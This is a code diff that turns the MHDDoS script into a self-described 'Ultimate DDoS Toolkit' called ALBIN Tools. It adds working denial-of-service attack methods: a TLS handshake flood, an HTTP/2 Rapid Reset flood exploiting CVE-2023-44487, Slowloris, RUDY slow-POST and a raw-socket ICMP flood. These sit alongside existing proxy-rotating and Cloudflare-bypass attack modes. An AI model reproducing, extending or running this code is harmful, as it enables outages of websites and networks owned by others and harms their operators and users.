@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
- 
+# ALBIN Tools - Ultimate DDoS Toolkit (MHDDoS Enhanced)
+# Full integration of Layer 4 & Layer 7 attack methods, including CF bypass, TLS flood, HTTP/2 Rapid Reset, etc.
+
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
@@ -25,6 +27,21 @@ from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
 from uuid import UUID, uuid4
+import http.client
+import asyncio
+
+# Optional dependencies for new methods
+try:
+    import aiohttp
+    HAS_AIOHTTP = True
+except:
+    HAS_AIOHTTP = False
+try:
+    import h2.connection
+    import h2.config
+    HAS_H2 = True
+except:
+    HAS_H2 = False
 
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
@@ -40,21 +57,19 @@ from base64 import b64encode
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
-logger = getLogger("MHDDoS")
+logger = getLogger("ALBIN")
 logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
-# Enforce only TLSv1.2+ (defense-in-depth: also disable older protocols explicitly)
 if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
-# Disable insecure TLS versions for additional safety
 if hasattr(ssl, "OP_NO_TLSv1"):
     ctx.options |= ssl.OP_NO_TLSv1
 if hasattr(ssl, "OP_NO_TLSv1_1"):
     ctx.options |= ssl.OP_NO_TLSv1_1
 
-__version__: str = "2.4 SNAPSHOT"
+__version__: str = "ALBIN 1.0"
 __dir__: Path = Path(__file__).parent
 __ip__: Any = None
 tor2webs = [
@@ -126,7 +141,9 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
+        # New methods
+        "TLS_HANDSHAKE", "HTTP2_RAPID", "SLOWLORIS", "RUDY"
     }
 
     LAYER4_AMP: Set[str] = {
@@ -138,6 +155,7 @@ class Methods:
                                 "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                 "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
                                 "TS3", "MCPE", "ICMP", "OVH-UDP",
+                                "ICMP_FLOOD"
                                 }
 
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
@@ -475,6 +493,7 @@ class Layer4(Thread):
             "CPS": self.CPS,
             "CONNECTION": self.CONNECTION,
             "MCBOT": self.MCBOT,
+            "ICMP_FLOOD": self.ICMP_FLOOD,
         }
 
     def run(self) -> None:
@@ -550,6 +569,15 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def ICMP(self) -> None:
+        payload = self._genrate_icmp()
+        s = None
+        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
+            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+            while Tools.sendto(s, payload, self._target):
+                continue
+        Tools.safe_close(s)
+
+    def ICMP_FLOOD(self) -> None:
         payload = self._genrate_icmp()
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
@@ -733,6 +761,9 @@ class Layer4(Thread):
             elif name == "ICMP":
                 self.SENT_FLOOD = self.ICMP
                 self._target = (self._target[0], 0)
+            elif name == "ICMP_FLOOD":
+                self.SENT_FLOOD = self.ICMP_FLOOD
+                self._target = (self._target[0], 0)
             elif name == "RDP":
                 self._amp_payload = (
                     b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
@@ -834,6 +865,11 @@ class HttpFlood(Thread):
             "BOMB": self.BOMB,
             "PPS": self.PPS,
             "KILLER": self.KILLER,
+            # New methods
+            "TLS_HANDSHAKE": self.TLS_HANDSHAKE,
+            "HTTP2_RAPID": self.HTTP2_RAPID,
+            "SLOWLORIS": self.SLOWLORIS,
+            "RUDY": self.RUDY,
         }
 
         if not referers:
@@ -908,7 +944,7 @@ class HttpFlood(Thread):
         for key, value in self.methods.items():
             if name == key:
                 self.SENT_FLOOD = value
-                
+
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
@@ -960,7 +996,7 @@ class HttpFlood(Thread):
     def getMethodType(method: str) -> str:
         return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
-                                            "BOT", "RHEX", "STOMP"} \
+                                            "BOT", "RHEX", "STOMP", "SLOWLORIS", "RUDY"} \
             else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
@@ -1360,6 +1396,88 @@ class HttpFlood(Thread):
                     break
         Tools.safe_close(s)
 
+    # ========== NEW METHODS ==========
+    def TLS_HANDSHAKE(self):
+        """TLS handshake flood - high CPU usage on target"""
+        global REQUESTS_SENT
+        try:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = socket(AF_INET, SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((self._host, self._target.port or 443))
+            ssl_sock = context.wrap_socket(sock, server_hostname=self._target.host)
+            ssl_sock.close()
+            REQUESTS_SENT += 1
+        except:
+            REQUESTS_SENT += 1
+
+    def HTTP2_RAPID(self):
+        """HTTP/2 Rapid Reset (CVE-2023-44487)"""
+        global REQUESTS_SENT
+        if not HAS_H2:
+            return
+        try:
+            sock = socket(AF_INET, SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((self._host, self._target.port or 443))
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            ssl_sock = context.wrap_socket(sock, server_hostname=self._target.host)
+            config = h2.config.H2Configuration(client_side=True)
+            conn = h2.connection.H2Connection(config=config)
+            conn.initiate_connection()
+            ssl_sock.send(conn.data_to_send())
+            for _ in range(100):
+                stream_id = conn.get_next_available_stream_id()
+                conn.send_headers(stream_id, [
+                    (':method', 'GET'),
+                    (':path', '/'),
+                    (':scheme', 'https'),
+                    (':authority', self._target.host),
+                ], end_stream=True)
+                conn.reset_stream(stream_id, error_code=0x8)  # rapid reset
+                ssl_sock.send(conn.data_to_send())
+            ssl_sock.close()
+            REQUESTS_SENT += 1
+        except:
+            REQUESTS_SENT += 1
+
+    def SLOWLORIS(self):
+        """Slowloris - keep many connections half-open"""
+        global REQUESTS_SENT
+        try:
+            sock = socket(AF_INET, SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((self._host, self._target.port or 80))
+            sock.send(f"GET / HTTP/1.1\r\nHost: {self._target.host}\r\n".encode())
+            for _ in range(self._rpc):
+                sock.send(f"X-{randint(1,5000)}: {randbytes(5).hex()}\r\n".encode())
+                sleep(5)
+            sock.close()
+            REQUESTS_SENT += 1
+        except:
+            REQUESTS_SENT += 1
+
+    def RUDY(self):
+        """R U Dead Yet? - slow POST with large content-length"""
+        global REQUESTS_SENT
+        try:
+            sock = socket(AF_INET, SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((self._host, self._target.port or 80))
+            payload = f"POST / HTTP/1.1\r\nHost: {self._target.host}\r\nContent-Length: 1000000\r\n\r\n"
+            sock.send(payload.encode())
+            for _ in range(100):
+                sock.send(b"a")
+                sleep(0.1)
+            sock.close()
+            REQUESTS_SENT += 1
+        except:
+            REQUESTS_SENT += 1
+
 
 class ProxyManager:
 
@@ -1416,7 +1534,7 @@ class ToolsConsole:
 
     @staticmethod
     def runConsole():
-        cons = f"{gethostname()}@MHTools:~#"
+        cons = f"{gethostname()}@ALBIN:~#"
 
         while 1:
             cmd = input(cons + " ").strip()
@@ -1574,7 +1692,7 @@ class ToolsConsole:
     @staticmethod
     def usage():
         print((
-                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
+                  '* ALBIN Tools - Ultimate DDoS Toolkit with %d Methods\n'
                   'Note: If the Proxy list is empty, The attack will run without proxies\n'
                   '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                   '      Proxy Type 0 = All in config.json\n'
@@ -1677,6 +1795,14 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
 
 if __name__ == '__main__':
+    print("""
+    ╔══════════════════════════════════════════════════════════╗
+    ║                    ALBIN TOOLS v1.0                      ║
+    ║         Ultimate DDoS Toolkit - All Methods Combined     ║
+    ║   Including: CFB, TLS_HANDSHAKE, HTTP2_RAPID, SLOWLORIS, ║
+    ║   RUDY, ICMP_FLOOD, TCP, UDP, SYN, and many more...      ║
+    ╚══════════════════════════════════════════════════════════╝
+    """)
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
             one = argv[1].upper()
@@ -1774,7 +1900,7 @@ if __name__ == '__main__':
                 if port > 65535 or port < 1:
                     exit("Invalid Port [Min: 1 / Max: 65535] ")
 
-                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
+                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP", "ICMP_FLOOD"} and \
                         not ToolsConsole.checkRawSocket():
                     exit("Cannot Create Raw Socket")
 
@@ -1791,7 +1917,7 @@ if __name__ == '__main__':
                     logger.warning("Port Not Selected, Set To Default: 80")
                     port = 80
 
-                if method in {"SYN", "ICMP"}:
+                if method in {"SYN", "ICMP", "ICMP_FLOOD"}:
                     __ip__ = __ip__
 
                 if len(argv) >= 6:
